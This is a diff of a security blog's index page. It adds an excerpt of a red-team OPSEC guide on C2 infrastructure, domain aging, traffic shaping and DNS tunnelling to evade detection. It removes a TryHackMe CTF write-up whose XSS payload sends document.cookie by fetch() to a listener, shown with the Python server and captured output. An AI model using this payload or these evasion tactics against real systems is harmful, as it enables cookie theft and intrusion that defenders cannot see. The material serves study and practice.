@@ -138,6 +138,59 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2026/08/30/2026-08-30-redteam-opsec/" ></a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-08-30  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="Infrastructure-Segmentation"><a href="#Infrastructure-Segmentation" class="headerlink" title="Infrastructure Segmentation"></a>Infrastructure Segmentation</h2><ul>
+<li><strong>Tier infra by burn tolerance.</strong><ul>
+<li>Long-haul C2 (redirectors, domains) → protect heavily, isolate fully</li>
+<li>Short-haul (scanning boxes, phishing landers) → expect to burn, plan for it</li>
+<li>Throwaway (single-use VPS, one action) → disposable by design</li>
+<li>Rule: short-haul infra never shares a hosting account, SSH key, or billing method with long-haul infra. Ever.</li>
+</ul>
+</li>
+<li><strong>Age your domains.</strong> Register months ahead of use, let them sit with a benign parked page or fake blog. A freshly registered domain gets flagged by reputation engines almost immediately: this isn’t optional anymore.</li>
+<li><strong>Pre-categorize domains</strong> with reputation services (Bluecoat, Cisco Talos, Palo Alto URL filtering) before the engagement starts, so they resolve as “business”&#x2F;“technology” instead of “uncategorized”: which is itself a detection signal on a lot of proxy&#x2F;SWG rulesets.</li>
+<li><strong>TLS hygiene.</strong> Let’s Encrypt or a real CA for anything client-facing. Self-signed certs on a random VPS will get you caught.</li>
+</ul>
+<hr>
+<h2 id="C2-Traffic-Shaping"><a href="#C2-Traffic-Shaping" class="headerlink" title="C2 Traffic Shaping"></a>C2 Traffic Shaping</h2><ul>
+<li><strong>Domain&#x2F;CDN fronting</strong>: mostly dead now. Cloudflare, AWS etc. actively detect and block it. Worth knowing how it works, not worth building a plan around.</li>
+<li><strong>Malleable C2 profiles</strong>: shape beacon traffic to look like Slack, Teams, OneDrive API calls instead of raw HTTP POSTs.</li>
+<li><strong>Jitter + sleep timers</strong>: same logic as scan-delay jitter. A static beacon interval gets caught by traffic analysis in minutes. Randomize it.</li>
+<li><strong>Match traffic volume to the mimicked protocol.</strong> Payload sizes that are too big or too small for what you’re impersonating stand out immediately.</li>
+</ul>
+<hr>
+<h2 id="DNS-Layer-OPSEC"><a href="#DNS-Layer-OPSEC" class="headerlink" title="DNS-Layer OPSEC"></a>DNS-Layer OPSEC</h2><ul>
+<li><strong>DoH for C2&#x2F;exfil</strong> blends into normal DoH traffic to Cloudflare&#x2F;Google resolvers: much harder for network-layer DNS monitoring to catch.</li>
+<li><strong>Low-and-slow DNS tunneling.</strong> Throttle the query rate hard. Detection keys almost entirely on volume&#x2F;entropy per domain over time.</li>
+<li><strong>Your own DNS logs are a leak vector too.</strong> If you control the domain, remember the DNS provider is logging every lookup: including from defenders investigating you mid-engagement.</li>
+</ul>
+<hr>
+<h2 id="Endpoint-Payload-OPSEC"><a href="#Endpoint-Payload-OPSEC" class="headerlink" title="Endpoint &amp; Payload OPSEC"></a>Endpoint &amp; Payload OPSEC</h2>
+	
+	</div>
+  <a type="button" href="/2026/08/30/2026-08-30-redteam-opsec/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2026/08/13/2026-08-13-de-morgan/" title="Turing Comeplete - De Morgan&#39;s law">De Morgan&#39;s law</a>
 		</h3>
 		</div>
@@ -571,42 +624,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2026/05/02/2026-05-02-Cupids-matchmaker/" title="Writeup for Cupid&#39;s matchmaker.">Cupid&#39;s matchmaker - CTF Writeup</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2026-05-02  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>After inspecting the site, one small detail in the Survey stood out:<br><em><strong>Our team reads every word! Be creative and specific.</strong></em><br>when reading this i instantly thought about XSS.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line">fetch(&#x27;http://localhost:8000&#x27;, &#123;  </span><br><span class="line">method: &#x27;POST&#x27;,  </span><br><span class="line">mode: &#x27;no-cors&#x27;,  </span><br><span class="line">body:document.cookie  </span><br><span class="line">&#125;);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>this is a very simple payload which requires the site to have no real input validation.<br>I set up a python3 webserver using the following code:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from http.server import HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class PostHandler(SimpleHTTPRequestHandler):</span><br><span class="line">    def do_POST(self):</span><br><span class="line">        content_length = int(self.headers[&#x27;Content-Length&#x27;])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        </span><br><span class="line">        # Log the POST data</span><br><span class="line">        print(f&quot;POST request received:&quot;)</span><br><span class="line">        print(f&quot;Path: &#123;self.path&#125;&quot;)</span><br><span class="line">        print(f&quot;Headers: &#123;self.headers&#125;&quot;)</span><br><span class="line">        print(f&quot;Body: &#123;post_data.decode(&#x27;utf-8&#x27;)&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # Send response</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        </span><br><span class="line">        response = &#123;&#x27;status&#x27;: &#x27;success&#x27;, &#x27;received&#x27;: post_data.decode(&#x27;utf-8&#x27;)&#125;</span><br><span class="line">        self.wfile.write(json.dumps(response).encode())</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    server = HTTPServer((&#x27;localhost&#x27;, 8000), PostHandler)</span><br><span class="line">    print(&#x27;Server running on http://localhost:8000&#x27;)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>to get the flag all i had to do is start the webserver by running: <em><strong>python3 server.py</strong></em><br>and sent the payload via the survey.</p>
-<p>at the end i got the flag:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Body: flag=THM&#123;XSS_CuP1d_Str1k3s_Ag41n&#125;</span><br><span class="line">10.66.169.156 - - [15/Feb/2026 09:45:15] &quot;POST / HTTP/1.1&quot; 200 -</span><br><span class="line">POST request received:</span><br><span class="line">Path: /</span><br><span class="line">Headers: Host: 192.168.134.175:8000</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 33</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:5000</span><br><span class="line">Referer: http://localhost:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.</span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2026/05/02/2026-05-02-Cupids-matchmaker/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -673,31 +690,31 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/portswigger/">portswigger<span>1</span></a></li>
-		
-			<li><a href="/tags/hackthebox/">hackthebox<span>6</span></a></li>
+			<li><a href="/tags/walkthrough/">walkthrough<span>1</span></a></li>
 		
 			<li><a href="/tags/guide/">guide<span>2</span></a></li>
 		
-			<li><a href="/tags/hardware/">hardware<span>1</span></a></li>
+			<li><a href="/tags/labs/">labs<span>1</span></a></li>
 		
-			<li><a href="/tags/opsec/">opsec<span>1</span></a></li>
+			<li><a href="/tags/portswigger/">portswigger<span>1</span></a></li>
+		
+			<li><a href="/tags/architecture/">architecture<span>1</span></a></li>
 		
 			<li><a href="/tags/tryhackme/">tryhackme<span>2</span></a></li>
 		
+			<li><a href="/tags/hackthebox/">hackthebox<span>6</span></a></li>
+		
+			<li><a href="/tags/opsec/">opsec<span>1</span></a></li>
+		
 			<li><a href="/tags/web-security/">web-security<span>2</span></a></li>
+		
+			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
 		
 			<li><a href="/tags/security/">security<span>3</span></a></li>
 		
 			<li><a href="/tags/dns/">dns<span>1</span></a></li>
 		
-			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
-		
-			<li><a href="/tags/walkthrough/">walkthrough<span>1</span></a></li>
-		
-			<li><a href="/tags/architecture/">architecture<span>1</span></a></li>
-		
-			<li><a href="/tags/labs/">labs<span>1</span></a></li>
+			<li><a href="/tags/hardware/">hardware<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -709,6 +726,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2026/08/30/2026-08-30-redteam-opsec/" ><i class="fa fa-file-o"></i></a>
+      </li>
     
       <li>
         <a href="/2026/08/13/2026-08-13-de-morgan/"  title="Turing Comeplete - De Morgan&#39;s law" ><i class="fa fa-file-o"></i>De Morgan&#39;s law</a>
@@ -724,10 +745,6 @@
     
       <li>
         <a href="/2026/07/13/2026-07-13-dns-data-exfil/"  title="A short showcase of how DNS can be abused as a data exfiltration channel." ><i class="fa fa-file-o"></i>Data Exfiltration by Abusin...</a>
-      </li>
-    
-      <li>
-        <a href="/2026/06/27/2026-06-27-abusing-system-services/"  title="A short showcase of user-level persistence through systemd user services on a Linux host." ><i class="fa fa-file-o"></i>Persistence by Abusing syst...</a>
       </li>
     
   </ul>
